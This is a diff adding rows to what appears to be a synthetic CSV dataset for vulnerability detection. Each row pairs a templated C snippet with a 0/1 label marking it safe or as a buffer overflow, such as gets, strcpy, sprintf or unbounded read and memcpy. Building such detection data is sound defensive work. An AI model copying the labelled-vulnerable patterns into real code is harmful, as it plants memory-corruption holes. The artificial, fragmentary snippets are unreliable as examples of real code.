+// end",1
+"void read_user_input(){ char buf[8]; read(fd, buf, min(1024, sizeof(buf))); }",0
+"void func(char *s){ char user_input_buf[5]; strcpy(user_input_buf, s); }
+}",1
+"// user input handler
+void read_user_input(){ char buffer[64]; read(fd, buffer, 1024); }",1
+"/* fixed */
+char buf[20]; strncat(buf, extra, sizeof(buf)-strlen(buf)-1);
+}",0
+"char dataf[50]; memcpy(dataf, src, min(len, sizeof(dataf)));
+// end",0
+"/* fixed */
+void read_user_input(){ char tmp[64]; read(fd, tmp, min(1024, sizeof(tmp))); }",0
+"/* vulnerable */
+void read_user_input(){ char tmp[16]; read(fd, tmp, 1024); }
+}",1
+"void f(){
+  char buf[10];
+gets(buf);",1
+"char data[10];
+fgets(data, sizeof(data), stdin);
+// end",0
+"char buf[10];
+gets(buf);",1
+"char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);
+// end",1
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+}",1
+"/* fixed */
+void func(char *s){ char user_input_buf[5]; strncpy(user_input_buf, s, 4); user_input_buf[4]=0; }",0
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);",1
+"/* fixed */
+char tmp[8]; for(i=0;i<min(strlen(s), sizeof(tmp)-1); i++) tmp[i]=s[i]; tmp[min(strlen(s), sizeof(tmp)-1)]=0;
+// end",0
+"// safe example
+char buf[10];
+fgets(buf, sizeof(buf), stdin);
+// end",0
+"/* fixed */
+void read_user_input(){ char tmp[8]; read(fd, tmp, min(1024, sizeof(tmp))); }
+}",0
+"// safe example
+char tmp[8];
+strncpy(tmp, user_input, 7);
+// end",0
+"/* fixed */
+char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);
+}",0
+"/* fixed */
+char data[8];
+strncpy(data, user_input, 7);
+}",0
+"void func(char *s){ char buffer[5]; strcpy(buffer, s); }
+}",1
+"void f(){
+  char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"// user input handler
+void func(char *s){ char buf[5]; strcpy(buf, s); }
+}",1
+"void f(){
+  char tmpf[50]; memcpy(tmpf, src, len);",1
+"void f(){
+  char buffer[10];
+gets(buffer);
+}",1
+"void f(){
+  void read_user_input(){ char data[16]; read(fd, data, 1024); }
+}",1
+"/* fixed */
+void read_user_input(){ char tmp[32]; read(fd, tmp, min(1024, sizeof(tmp))); }
+}",0
+"void func(char *s){ char data[5]; strcpy(data, s); }",1
+"void f(){
+  char *p = malloc(10);
+strcpy(p, data);",1
+"char tmp[8];
+strncpy(tmp, user_input, 7);
+// end",0
+"/* vulnerable */
+char name[32]; scanf(""%s"", name);",1
+"void f(){
+  char data[10];
+gets(data);
+}",1
+"void f(){
+  char buf[8];
+strncpy(buf, user_input, 7);",0
+"/* fixed */
+char user_input_buf[8]; for(i=0;i<min(strlen(s), sizeof(user_input_buf)-1); i++) user_input_buf[i]=s[i]; user_input_buf[min(strlen(s), sizeof(user_input_buf)-1)]=0;",0
+"char bufferf[50]; memcpy(bufferf, src, min(len, sizeof(bufferf)));",0
+"void f(){
+  char user_input_buf[20]; strncat(user_input_buf, extra, sizeof(user_input_buf)-strlen(user_input_buf)-1);",0
+"/* fixed */
+char user_input_buf[16];
+snprintf(user_input_buf, sizeof(user_input_buf), ""%s%s"", a, b);
+}",0
+"/* fixed */
+char buffer[8];
+strncpy(buffer, user_input, 7);",0
+"void func(char *s){ char tmp[5]; strncpy(tmp, s, 4); tmp[4]=0; }",0
+"char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);",0
+"void f(){
+  char user_input_buf[8]; for(i=0;i<strlen(s);i++) user_input_buf[i]=s[i];
+}",1
+"/* vulnerable */
+void read_user_input(){ char buffer[16]; read(fd, buffer, 1024); }
+}",1
+"/* vulnerable */
+char user_input_buff[50]; memcpy(user_input_buff, src, len);",1
+"char name[32]; scanf(""%s"", name);
+// end",1
+"// safe example
+char name[32]; scanf(""%31s"", name);",0
+"void f(){
+  char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+// end",0
+"char buf[10];
+gets(buf);",1
+"/* fixed */
+char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);
+}",0
+"void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }
+// end",0
+"/* vulnerable */
+void read_user_input(){ char user_input_buf[16]; read(fd, user_input_buf, 1024); }
+// end",1
+"/* vulnerable */
+char bufferf[50]; memcpy(bufferf, src, len);
+// end",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);",0
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+// end",0
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"char tmp[20]; strncat(tmp, extra, sizeof(tmp)-strlen(tmp)-1);
+}",0
+"char data[16];
+sprintf(data, ""%s%s"", a, b);",1
+"char user_input_buf[20]; strncat(user_input_buf, extra, sizeof(user_input_buf)-strlen(user_input_buf)-1);",0
+"/* vulnerable */
+char bufferf[50]; memcpy(bufferf, src, len);
+}",1
+"/* vulnerable */
+char tmpf[50]; memcpy(tmpf, src, len);",1
+"void f(){
+  char buffer[16];
+snprintf(buffer, sizeof(buffer), ""%s%s"", a, b);
+}",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"/* fixed */
+char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+}",0
+"/* vulnerable */
+char buf[8];
+strcpy(buf, user_input);",1
+"/* fixed */
+char buf[8]; for(i=0;i<min(strlen(s), sizeof(buf)-1); i++) buf[i]=s[i]; buf[min(strlen(s), sizeof(buf)-1)]=0;",0
+"/* fixed */
+char user_input_buf[10];
+fgets(user_input_buf, sizeof(user_input_buf), stdin);
+// end",0
+"void f(){
+  void read_user_input(){ char data[32]; read(fd, data, min(1024, sizeof(data))); }
+}",0
+"void f(){
+  void func(char *s){ char data[5]; strncpy(data, s, 4); data[4]=0; }",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"char tmpf[50]; memcpy(tmpf, src, len);
+// end",1
+"void f(){
+  char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);",1
+"// safe example
+void func(char *s){ char user_input_buf[5]; strncpy(user_input_buf, s, 4); user_input_buf[4]=0; }",0
+"void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"// user input handler
+char user_input_buff[50]; memcpy(user_input_buff, src, len);
+}",1
+"/* fixed */
+char name[32]; scanf(""%31s"", name);
+}",0
+"char user_input_buf[20]; strncat(user_input_buf, extra, sizeof(user_input_buf)-strlen(user_input_buf)-1);
+// end",0
+"// safe example
+char user_input_buf[20]; strncat(user_input_buf, extra, sizeof(user_input_buf)-strlen(user_input_buf)-1);
+// end",0
+"void f(){
+  char data[10];
+fgets(data, sizeof(data), stdin);",0
+"/* vulnerable */
+char tmpf[50]; memcpy(tmpf, src, len);
+}",1
+"/* fixed */
+char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+// end",0
+"// safe example
+char buf[8]; for(i=0;i<min(strlen(s), sizeof(buf)-1); i++) buf[i]=s[i]; buf[min(strlen(s), sizeof(buf)-1)]=0;
+}",0
+"// safe example
+char user_input_buff[50]; memcpy(user_input_buff, src, min(len, sizeof(user_input_buff)));
+// end",0
+"void read_user_input(){ char buf[8]; read(fd, buf, 1024); }",1
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"char data[8]; for(i=0;i<strlen(s);i++) data[i]=s[i];
+}",1
+"void func(char *s){ char data[5]; strcpy(data, s); }
+// end",1
+"/* vulnerable */
+char user_input_buff[50]; memcpy(user_input_buff, src, len);
+// end",1
+"// safe example
+void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }
+}",0
+"/* fixed */
+char user_input_buff[50]; memcpy(user_input_buff, src, min(len, sizeof(user_input_buff)));
+// end",0
+"// user input handler
+void read_user_input(){ char buf[16]; read(fd, buf, 1024); }",1
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"// user input handler
+void read_user_input(){ char tmp[32]; read(fd, tmp, 1024); }
+// end",1
+"void f(){
+  char buf[16];
+sprintf(buf, ""%s%s"", a, b);",1
+"/* vulnerable */
+char tmp[10];
+gets(tmp);
+}",1
+"void f(){
+  void func(char *s){ char user_input_buf[5]; strncpy(user_input_buf, s, 4); user_input_buf[4]=0; }
+}",0
+"void f(){
+  char name[32]; scanf(""%s"", name);
+}",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+// end",0
+"/* vulnerable */
+char data[10];
+gets(data);",1
+"// safe example
+char name[32]; scanf(""%31s"", name);",0
+"void f(){
+  char user_input_buf[10];
+gets(user_input_buf);
+}",1
+"// user input handler
+char data[16];
+sprintf(data, ""%s%s"", a, b);
+// end",1
+"/* vulnerable */
+void read_user_input(){ char tmp[16]; read(fd, tmp, 1024); }
+}",1
+"/* vulnerable */
+char buf[8];
+strcpy(buf, user_input);",1
+"void f(){
+  char *p = malloc(10);
+strncpy(p, data, 9);",0
+"char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  void read_user_input(){ char tmp[32]; read(fd, tmp, 1024); }
+// end",1
+"/* fixed */
+void func(char *s){ char buffer[5]; strncpy(buffer, s, 4); buffer[4]=0; }
+// end",0
+"// safe example
+char buf[10];
+fgets(buf, sizeof(buf), stdin);",0
+"void f(){
+  char user_input_buf[20]; strcat(user_input_buf, extra);
+}",1
+"/* vulnerable */
+char buf[8];
+strcpy(buf, user_input);",1
+"// safe example
+char buffer[8];
+strncpy(buffer, user_input, 7);
+}",0
+"void f(){
+  void read_user_input(){ char buffer[32]; read(fd, buffer, min(1024, sizeof(buffer))); }
+// end",0
+"// user input handler
+char tmp[8];
+strcpy(tmp, user_input);",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"/* vulnerable */
+char user_input_buf[20]; strcat(user_input_buf, extra);",1
+"/* fixed */
+char buffer[16];
+snprintf(buffer, sizeof(buffer), ""%s%s"", a, b);",0
+"void f(){
+  void func(char *s){ char data[5]; strcpy(data, s); }
+}",1
+"void f(){
+  char *p = malloc(10);
+strcpy(p, data);",1
+"/* fixed */
+void read_user_input(){ char buf[8]; read(fd, buf, min(1024, sizeof(buf))); }
+}",0
+"void f(){
+  char user_input_buf[8];
+strncpy(user_input_buf, user_input, 7);",0
+"void f(){
+  char buff[50]; memcpy(buff, src, len);
+}",1
+"/* fixed */
+void read_user_input(){ char tmp[8]; read(fd, tmp, min(1024, sizeof(tmp))); }
+}",0
+"void f(){
+  char buffer[8];
+strncpy(buffer, user_input, 7);
+}",0
+"// user input handler
+char buff[50]; memcpy(buff, src, len);",1
+"/* vulnerable */
+char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);",1
+"/* vulnerable */
+void func(char *s){ char data[5]; strcpy(data, s); }
+// end",1
+"void func(char *s){ char buffer[5]; strcpy(buffer, s); }
+}",1
+"// safe example
+char dataf[50]; memcpy(dataf, src, min(len, sizeof(dataf)));
+}",0
+"char tmp[8];
+strcpy(tmp, user_input);
+// end",1
+"void f(){
+  char *p = malloc(10);
+strncpy(p, data, 9);",0
+"/* fixed */
+char name[32]; scanf(""%31s"", name);",0
+"/* vulnerable */
+char tmp[20]; strcat(tmp, extra);
+// end",1
+"/* vulnerable */
+void read_user_input(){ char data[64]; read(fd, data, 1024); }",1
+"void f(){
+  char tmp[20]; strcat(tmp, extra);
+// end",1
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);
+}",0
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"char user_input_buf[8]; for(i=0;i<min(strlen(s), sizeof(user_input_buf)-1); i++) user_input_buf[i]=s[i]; user_input_buf[min(strlen(s), sizeof(user_input_buf)-1)]=0;",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"// user input handler
+void read_user_input(){ char tmp[8]; read(fd, tmp, 1024); }
+// end",1
+"void f(){
+  void read_user_input(){ char buffer[16]; read(fd, buffer, min(1024, sizeof(buffer))); }",0
+"/* vulnerable */
+char buffer[20]; strcat(buffer, extra);
+// end",1
+"// user input handler
+char tmp[8]; for(i=0;i<strlen(s);i++) tmp[i]=s[i];
+// end",1
+"void f(){
+  char tmpf[50]; memcpy(tmpf, src, min(len, sizeof(tmpf)));
+// end",0
+"void f(){
+  char name[32]; scanf(""%31s"", name);",0
+"char *p = malloc(10);
+strncpy(p, data, 9);",0
+"// safe example
+char tmp[8];
+strncpy(tmp, user_input, 7);
+}",0
+"// safe example
+char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+// end",0
+"void func(char *s){ char data[5]; strcpy(data, s); }
+// end",1
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);",1
+"/* fixed */
+char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+// end",0
+"/* vulnerable */
+char dataf[50]; memcpy(dataf, src, len);",1
+"void f(){
+  char buf[20]; strcat(buf, extra);
+}",1
+"/* fixed */
+char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);",0
+"char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);
+// end",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char name[32]; scanf(""%31s"", name);",0
+"char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char user_input_buf[8];
+strcpy(user_input_buf, user_input);
+}",1
+"void f(){
+  char user_input_buf[16];
+snprintf(user_input_buf, sizeof(user_input_buf), ""%s%s"", a, b);
+}",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char buf[8]; for(i=0;i<strlen(s);i++) buf[i]=s[i];",1
+"/* fixed */
+char buffer[8];
+strncpy(buffer, user_input, 7);
+}",0
+"char tmpf[50]; memcpy(tmpf, src, min(len, sizeof(tmpf)));
+}",0
+"void f(){
+  char buff[50]; memcpy(buff, src, len);
+}",1
+"void f(){
+  char tmpf[50]; memcpy(tmpf, src, min(len, sizeof(tmpf)));",0
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);
+}",0
+"void f(){
+  char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+}",0
+"void f(){
+  char data[20]; strcat(data, extra);
+}",1
+"// user input handler
+char user_input_buff[50]; memcpy(user_input_buff, src, len);
+}",1
+"// user input handler
+char buf[8]; for(i=0;i<strlen(s);i++) buf[i]=s[i];
+}",1
+"void f(){
+  char name[32]; scanf(""%s"", name);
+// end",1
+"/* vulnerable */
+char buf[16];
+sprintf(buf, ""%s%s"", a, b);
+}",1
+"char buf[16];
+snprintf(buf, sizeof(buf), ""%s%s"", a, b);",0
+"void f(){
+  char user_input_buf[16];
+snprintf(user_input_buf, sizeof(user_input_buf), ""%s%s"", a, b);
+// end",0
+"char buffer[8];
+strcpy(buffer, user_input);
+}",1
+"// user input handler
+char user_input_buf[8]; for(i=0;i<strlen(s);i++) user_input_buf[i]=s[i];
+}",1
+"// safe example
+char buf[8];
+strncpy(buf, user_input, 7);",0
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"/* fixed */
+char tmp[8];
+strncpy(tmp, user_input, 7);
+// end",0
+"char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+// end",0
+"char user_input_buf[16];
+sprintf(user_input_buf, ""%s%s"", a, b);
+// end",1
+"/* vulnerable */
+char bufferf[50]; memcpy(bufferf, src, len);
+}",1
+"/* vulnerable */
+char buf[8]; for(i=0;i<strlen(s);i++) buf[i]=s[i];",1
+"void f(){
+  void func(char *s){ char buffer[5]; strncpy(buffer, s, 4); buffer[4]=0; }
+// end",0
+"void f(){
+  char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+// end",0
+"void read_user_input(){ char data[32]; read(fd, data, 1024); }
+}",1
+"// safe example
+char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+}",0
+"// user input handler
+char user_input_buf[10];
+gets(user_input_buf);
+// end",1
+"// safe example
+void read_user_input(){ char user_input_buf[64]; read(fd, user_input_buf, min(1024, sizeof(user_input_buf))); }
+}",0
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"/* vulnerable */
+char data[16];
+sprintf(data, ""%s%s"", a, b);
+}",1
+"void f(){
+  char user_input_buf[20]; strncat(user_input_buf, extra, sizeof(user_input_buf)-strlen(user_input_buf)-1);",0
+"char user_input_buf[8];
+strncpy(user_input_buf, user_input, 7);
+// end",0
+"/* vulnerable */
+char user_input_buf[20]; strcat(user_input_buf, extra);",1
+"void func(char *s){ char buffer[5]; strcpy(buffer, s); }
+// end",1
+"/* vulnerable */
+char buf[10];
+gets(buf);
+}",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char buf[8]; for(i=0;i<strlen(s);i++) buf[i]=s[i];
+}",1
+"void f(){
+  char name[32]; scanf(""%s"", name);
+}",1
+"void f(){
+  char tmpf[50]; memcpy(tmpf, src, min(len, sizeof(tmpf)));
+}",0
+"// user input handler
+char user_input_buf[16];
+sprintf(user_input_buf, ""%s%s"", a, b);
+// end",1
+"char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+}",0
+"/* vulnerable */
+char dataf[50]; memcpy(dataf, src, len);
+}",1
+"/* vulnerable */
+void func(char *s){ char buffer[5]; strcpy(buffer, s); }
+// end",1
+"void f(){
+  char data[16];
+snprintf(data, sizeof(data), ""%s%s"", a, b);",0
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char name[32]; scanf(""%s"", name);
+// end",1
+"// safe example
+char name[32]; scanf(""%31s"", name);
+}",0
+"char buf[16];
+snprintf(buf, sizeof(buf), ""%s%s"", a, b);
+// end",0
+"void f(){
+  char buf[16];
+snprintf(buf, sizeof(buf), ""%s%s"", a, b);
+}",0
+"char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+}",0
+"char name[32]; scanf(""%31s"", name);
+// end",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }",0
+"/* vulnerable */
+char user_input_buf[10];
+gets(user_input_buf);
+// end",1
+"// safe example
+char data[10];
+fgets(data, sizeof(data), stdin);
+// end",0
+"// user input handler
+char tmp[20]; strcat(tmp, extra);",1
+"char data[10];
+gets(data);",1
+"void f(){
+  char name[32]; scanf(""%s"", name);",1
+"/* vulnerable */
+char data[10];
+gets(data);",1
+"/* vulnerable */
+char user_input_buf[16];
+sprintf(user_input_buf, ""%s%s"", a, b);
+}",1
+"char name[32]; scanf(""%31s"", name);
+}",0
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);",0
+"char tmpf[50]; memcpy(tmpf, src, len);
+// end",1
+"// user input handler
+char tmp[20]; strcat(tmp, extra);",1
+"// safe example
+char buf[8]; for(i=0;i<min(strlen(s), sizeof(buf)-1); i++) buf[i]=s[i]; buf[min(strlen(s), sizeof(buf)-1)]=0;
+// end",0
+"void f(){
+  char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+// end",0
+"/* fixed */
+char data[16];
+snprintf(data, sizeof(data), ""%s%s"", a, b);",0
+"/* vulnerable */
+char bufferf[50]; memcpy(bufferf, src, len);
+// end",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"char tmpf[50]; memcpy(tmpf, src, len);
+// end",1
+"/* fixed */
+char buffer[16];
+snprintf(buffer, sizeof(buffer), ""%s%s"", a, b);",0
+"/* vulnerable */
+char data[8]; for(i=0;i<strlen(s);i++) data[i]=s[i];
+}",1
+"// safe example
+char buffer[16];
+snprintf(buffer, sizeof(buffer), ""%s%s"", a, b);
+// end",0
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"char *p = malloc(10);
+strncpy(p, data, 9);",0
+"/* vulnerable */
+char tmp[10];
+gets(tmp);",1
+"// user input handler
+char data[8];
+strcpy(data, user_input);
+// end",1
+"void f(){
+  char buf[20]; strncat(buf, extra, sizeof(buf)-strlen(buf)-1);
+// end",0
+"void func(char *s){ char tmp[5]; strcpy(tmp, s); }
+}",1
+"char buffer[16];
+sprintf(buffer, ""%s%s"", a, b);",1
+"/* fixed */
+char name[32]; scanf(""%31s"", name);",0
+"// user input handler
+char data[8]; for(i=0;i<strlen(s);i++) data[i]=s[i];
+// end",1
+"void f(){
+  void read_user_input(){ char data[64]; read(fd, data, 1024); }
+}",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"// user input handler
+char buff[50]; memcpy(buff, src, len);
+}",1
+"char data[8]; for(i=0;i<min(strlen(s), sizeof(data)-1); i++) data[i]=s[i]; data[min(strlen(s), sizeof(data)-1)]=0;
+}",0
+"// safe example
+char data[20]; strncat(data, extra, sizeof(data)-strlen(data)-1);
+// end",0
+"// user input handler
+char buf[10];
+gets(buf);",1
+"char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);",0
+"void f(){
+  char bufferf[50]; memcpy(bufferf, src, len);
+}",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+}",0
+"void read_user_input(){ char buf[64]; read(fd, buf, 1024); }",1
+"void f(){
+  char tmpf[50]; memcpy(tmpf, src, min(len, sizeof(tmpf)));
+// end",0
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);
+}",1
+"char user_input_buf[8]; for(i=0;i<min(strlen(s), sizeof(user_input_buf)-1); i++) user_input_buf[i]=s[i]; user_input_buf[min(strlen(s), sizeof(user_input_buf)-1)]=0;
+// end",0
+"// user input handler
+char data[20]; strcat(data, extra);
+}",1
+"void f(){
+  char data[16];
+sprintf(data, ""%s%s"", a, b);
+// end",1
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);
+}",0
+"// user input handler
+char buffer[8];
+strcpy(buffer, user_input);",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"/* vulnerable */
+char data[16];
+sprintf(data, ""%s%s"", a, b);
+// end",1
+"// user input handler
+char name[32]; scanf(""%s"", name);
+}",1
+"char buf[8];
+strncpy(buf, user_input, 7);
+// end",0
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"char buffer[16];
+sprintf(buffer, ""%s%s"", a, b);
+}",1
+"// safe example
+char tmp[10];
+fgets(tmp, sizeof(tmp), stdin);
+// end",0
+"void f(){
+  char buf[8];
+strncpy(buf, user_input, 7);
+}",0
+"char buffer[8];
+strcpy(buffer, user_input);
+// end",1
+"// user input handler
+char data[10];
+gets(data);
+// end",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+}",0
+"// safe example
+char buf[8];
+strncpy(buf, user_input, 7);
+// end",0
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void read_user_input(){ char buffer[64]; read(fd, buffer, min(1024, sizeof(buffer))); }",0
+"void f(){
+  char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char name[32]; scanf(""%s"", name);
+}",1
+"/* fixed */
+void read_user_input(){ char tmp[16]; read(fd, tmp, min(1024, sizeof(tmp))); }",0
+"char tmp[8]; for(i=0;i<min(strlen(s), sizeof(tmp)-1); i++) tmp[i]=s[i]; tmp[min(strlen(s), sizeof(tmp)-1)]=0;",0
+"/* vulnerable */
+char name[32]; scanf(""%s"", name);",1
+"/* fixed */
+char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+// end",0
+"/* fixed */
+char tmp[8];
+strncpy(tmp, user_input, 7);
+// end",0
+"char name[32]; scanf(""%31s"", name);
+}",0
+"void f(){
+  char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);
+// end",0
+"void f(){
+  char data[10];
+fgets(data, sizeof(data), stdin);",0
+"// safe example
+void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }
+}",0
+"/* vulnerable */
+char name[32]; scanf(""%s"", name);",1
+"// safe example
+char data[20]; strncat(data, extra, sizeof(data)-strlen(data)-1);
+// end",0
+"// user input handler
+char buf[8];
+strcpy(buf, user_input);
+// end",1
+"// safe example
+char bufferf[50]; memcpy(bufferf, src, min(len, sizeof(bufferf)));",0
+"void f(){
+  void func(char *s){ char buffer[5]; strcpy(buffer, s); }",1
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);",0
+"char user_input_buff[50]; memcpy(user_input_buff, src, len);",1
+"/* vulnerable */
+char tmp[8]; for(i=0;i<strlen(s);i++) tmp[i]=s[i];",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"void f(){
+  char buf[8];
+strncpy(buf, user_input, 7);
+// end",0
+"char name[32]; scanf(""%31s"", name);
+}",0
+"char buf[20]; strcat(buf, extra);
+// end",1
+"/* fixed */
+char name[32]; scanf(""%31s"", name);",0
+"void read_user_input(){ char data[64]; read(fd, data, 1024); }
+}",1
+"/* vulnerable */
+char data[16];
+sprintf(data, ""%s%s"", a, b);",1
+"char buffer[8];
+strcpy(buffer, user_input);
+}",1
+"void f(){
+  void func(char *s){ char user_input_buf[5]; strcpy(user_input_buf, s); }
+// end",1
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+}",1
+"char buf[20]; strncat(buf, extra, sizeof(buf)-strlen(buf)-1);",0
+"void f(){
+  char buf[10];
+fgets(buf, sizeof(buf), stdin);
+}",0
+"void f(){
+  char data[10];
+fgets(data, sizeof(data), stdin);",0
+"void f(){
+  void func(char *s){ char buf[5]; strcpy(buf, s); }
+}",1
+"// user input handler
+char buf[8];
+strcpy(buf, user_input);
+}",1
+"void f(){
+  char buffer[16];
+sprintf(buffer, ""%s%s"", a, b);
+// end",1
+"char tmp[8]; for(i=0;i<strlen(s);i++) tmp[i]=s[i];
+// end",1
+"void f(){
+  char bufferf[50]; memcpy(bufferf, src, len);",1
+"// user input handler
+char dataf[50]; memcpy(dataf, src, len);",1
+"// safe example
+char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);
+// end",0
+"char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char user_input_buf[8]; for(i=0;i<strlen(s);i++) user_input_buf[i]=s[i];
+// end",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+// end",0
+"/* fixed */
+char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);
+}",0
+"// user input handler
+void func(char *s){ char data[5]; strcpy(data, s); }
+// end",1
+"// user input handler
+char dataf[50]; memcpy(dataf, src, len);
+}",1
+"void f(){
+  void read_user_input(){ char buf[8]; read(fd, buf, min(1024, sizeof(buf))); }
+}",0
+"void f(){
+  char user_input_buf[20]; strcat(user_input_buf, extra);
+}",1
